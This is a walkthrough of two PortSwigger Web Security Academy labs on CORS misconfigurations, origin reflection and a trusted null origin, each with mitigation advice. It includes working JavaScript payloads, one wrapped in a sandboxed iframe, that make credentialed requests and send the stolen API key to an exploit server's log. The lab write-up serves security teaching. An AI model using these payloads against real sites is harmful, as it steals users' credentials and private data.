# Lab: CORS vulnerability with basic origin reflection
**Platform:** PortSwigger Web Security Academy
**Goal:** Exploit a CORS misconfiguration to steal the administrator's API key.
**Vulnerability:** Basic CORS Origin Reflection (The server blindly copies the `Origin` header from the request into the `Access-Control-Allow-Origin` response header and sets `Access-Control-Allow-Credentials: true`).

##  The Concept (Origin Echoing)
To support cross-origin requests, developers sometimes dynamically generate the `Access-Control-Allow-Origin` (ACAO) header by simply echoing whatever value is supplied in the incoming `Origin` header. If `Access-Control-Allow-Credentials` (ACAC) is also set to `true`, any malicious website can make an authenticated cross-origin request to the vulnerable application. The browser will see the ACAO header matching the attacker's origin, bypassing the Same-Origin Policy (SOP), and hand the sensitive response data directly to the attacker's JavaScript.

##  Step-by-Step Exploitation

### Step 1: Craft the Exploit Payload
Create an HTML/JS payload on the Exploit Server. This script makes an authenticated `GET` request to the target API, reads the sensitive response, and exfiltrates it by appending it as a query parameter to a request directed at the Exploit Server's `/log` endpoint.

```html
<script>
    var req = new XMLHttpRequest();
    // 1. Define the callback function to exfiltrate the data
    req.onload = function() {
        // Exfiltrate the JSON response (containing the API key) to the exploit server's logs
        window.location = "/log?key=" + encodeURIComponent(this.responseText);
    };
    // 2. Initialize the GET request to the vulnerable endpoint
    req.open("GET", "[https://YOUR-LAB-ID.web-security-academy.net/accountDetails](https://YOUR-LAB-ID.web-security-academy.net/accountDetails)", true);
    // 3. CRITICAL: Include credentials (session cookies) so the target identifies the victim
    req.withCredentials = true;
    // 4. Send the request
    req.send();
</script>
```
### Step 2: Exfiltrate the Data
1. Store the exploit and click Deliver exploit to victim.

2. The victim (administrator bot) executes the script, fetching their account details and sending them to your server.

3. Navigate to the Exploit Server's Access log.

4. Locate the incoming GET /log?key=... request.

5. URL-decode the key parameter to reveal the JSON object containing the administrator's apikey.

### Step 3: Submit the Solution
Copy the extracted API key and submit it via the "Submit solution" button on the lab's main page. Lab Solved! 

**Key Takeaway / Mitigation**: Never dynamically reflect the Origin header in the Access-Control-Allow-Origin header without strict validation. If an API is intended to be public, it should not support credentials. If it requires credentials, it must validate the Origin against a strict, hardcoded allowlist of trusted domains.




# 2nd lab



#  Lab: CORS vulnerability with trusted null origin
**Platform:** PortSwigger Web Security Academy
**Goal:** Exploit a CORS misconfiguration that explicitly trusts the `null` origin to steal the administrator's API key.
**Vulnerability:** Whitelisted `null` Origin in CORS configuration. 

## The Concept (The "null" Origin Trap)
Developers sometimes configure the `Access-Control-Allow-Origin` header to accept the `null` origin to support local development (e.g., loading `file://` URIs) or requests from sandboxed environments. However, an attacker can easily generate a request with a `null` origin. By embedding an exploitation script inside an `<iframe sandbox="allow-scripts allow-top-navigation">`, the browser treats the iframe's content as being from a unique, opaque origin, effectively setting the `Origin` header to `null`. The vulnerable server will accept this and return the sensitive data.

##  Step-by-Step Exploitation

### Step 1: Craft the Sandboxed Payload
Create an HTML payload on the Exploit Server using a sandboxed iframe. We use a `data:` URI to embed the JavaScript directly into the iframe's source. 
**Crucial:** Do NOT include `allow-same-origin` in the sandbox attributes. This ensures the origin remains `null`.

```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,
    <script>
        var req = new XMLHttpRequest();
        req.onload = function() {
            // Exfiltrate the stolen data to the attacker's log
            window.location = '[https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key=](https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key=)' + encodeURIComponent(this.responseText);
        };
        // Request the sensitive endpoint
        req.open('GET', '[https://YOUR-LAB-ID.web-security-academy.net/accountDetails](https://YOUR-LAB-ID.web-security-academy.net/accountDetails)', true);
        req.withCredentials = true; // Include session cookies
        req.send();
    </script>
"></iframe>
```
### Step 2: Exfiltrate the Data
1. Replace the Lab ID and Exploit Server ID in the payload.

2. Store and click Deliver exploit to victim.

3. The victim's browser executes the script inside the sandbox. The request is sent with Origin: null.

4. The server responds with Access-Control-Allow-Origin: null and the API key.

5. Go to the Exploit Server's Access log.

6. Find the exfiltration request (GET /log?key=...) and extract the apikey from the URL-decoded string.

### Step 3: Submit the Solution
Submit the extracted API key to solve the lab. 

**Key Takeaway / Mitigation:** Never whitelist the null origin in a production environment. The null origin is NOT synonymous with "trusted internal request." Any malicious website can easily spawn a sandboxed iframe to originate requests with a null origin.